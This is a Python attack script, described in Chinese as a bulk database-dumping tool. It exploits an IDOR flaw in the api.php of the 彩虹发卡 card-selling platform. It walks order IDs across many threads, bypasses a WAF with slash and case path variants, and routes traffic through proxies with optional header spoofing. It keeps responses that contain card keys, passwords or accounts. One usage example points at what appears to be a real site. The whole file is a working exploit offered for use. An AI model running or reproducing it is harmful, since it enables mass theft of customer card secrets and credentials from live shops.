#!/usr/bin/env python3
"""
彩虹发卡 api.php IDOR 批量拖库（斜杠 WAF bypass）。

示例:
  python3 rainbow_idor.py -u https://qq8.one --start 1 --end 100
  python3 rainbow_idor.py -u https://TARGET --start 1 --end 5000 -w 30 --proxy auto
  python3 rainbow_idor.py -u https://TARGET --act siteinfo
"""
from __future__ import annotations

import argparse
import json
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

import requests

from faka_common import DEFAULT_UA, apply_session, ensure_out, json_or_text, load_proxy, log, save_hit

BYPASS_PATHS = [
    "/api.php/?act={act}&id={id}",
    "/api.php?act={act}&id={id}",
    "/API.php/?act={act}&id={id}",
]


def has_cards(data: Any) -> bool:
    t = json.dumps(data, ensure_ascii=False) if isinstance(data, (dict, list)) else str(data)
    return any(k in t.lower() for k in ("kminfo", "卡密", "km", "card", "password", "account"))


def fetch_one(base: str, act: str, oid: int, timeout: int, proxy: str, use_xff: bool, cf: str) -> tuple[int, str, Any]:
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": DEFAULT_UA, "Referer": base.rstrip("/") + "/"})
    apply_session(s, proxy, use_xff, cf)
    last = None
    for tmpl in BYPASS_PATHS:
        if act != "search" and "{id}" in tmpl and oid == 0:
            url = base.rstrip("/") + tmpl.format(act=act, id="").replace("&id=", "")
        else:
            url = base.rstrip("/") + tmpl.format(act=act, id=oid)
        try:
            r = s.get(url, timeout=timeout)
            data = json_or_text(r)
            if isinstance(data, dict) and data.get("code") == 0:
                return oid, tmpl, data
            if isinstance(data, dict) and data:
                return oid, tmpl, data
            last = data
        except Exception as e:
            last = str(e)
    return oid, "", last


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="彩虹发卡 api.php IDOR")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--act", default="search")
    ap.add_argument("--start", type=int, default=1)
    ap.add_argument("--end", type=int, default=100)
    ap.add_argument("-w", "--workers", type=int, default=20)
    ap.add_argument("--timeout", type=int, default=25)
    ap.add_argument("--proxy", default="auto", help="auto|none|http://...")
    ap.add_argument("--xff", action="store_true")
    ap.add_argument("--cf-cookies", default="")
    ap.add_argument("--out", default="/data/tools/faka/out/rainbow_idor.jsonl")
    ap.add_argument("--dump-dir", default="", help="命中订单另存目录")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    proxy = load_proxy() if args.proxy == "auto" else ("" if args.proxy == "none" else args.proxy)
    dump_dir = Path(args.dump_dir) if args.dump_dir else None
    if dump_dir:
        dump_dir.mkdir(parents=True, exist_ok=True)

    log(f"rainbow IDOR {args.url} act={args.act} range={args.start}-{args.end} workers={args.workers}")

    # siteinfo 单次
    if args.act != "search" and args.start == 1 and args.end == 1:
        _, tmpl, data = fetch_one(args.url, args.act, 0, args.timeout, proxy, args.xff, args.cf_cookies)
        log(json.dumps(data, ensure_ascii=False)[:800])
        if data:
            save_hit(Path(args.out), "rainbow_act", {"act": args.act, "path": tmpl, "data": data})
        return

    hits = 0
    start = time.time()

    def task(oid: int):
        return fetch_one(args.url, args.act, oid, args.timeout, proxy, args.xff, args.cf_cookies)

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(task, i): i for i in range(args.start, args.end + 1)}
        for i, fut in enumerate(as_completed(futs), 1):
            oid, tmpl, data = fut.result()
            if isinstance(data, dict) and (data.get("code") == 0 or has_cards(data)):
                hits += 1
                save_hit(Path(args.out), "rainbow_idor", {"id": oid, "path": tmpl, "data": data})
                if dump_dir:
                    (dump_dir / f"order_{oid}.json").write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
                log(f"[+] id={oid} {str(data)[:180]}")
            if i % 200 == 0:
                log(f"  progress {i}/{args.end - args.start + 1} hits={hits}")

    log(f"完成 hits={hits} {time.time()-start:.1f}s -> {args.out}")


if __name__ == "__main__":
    main()
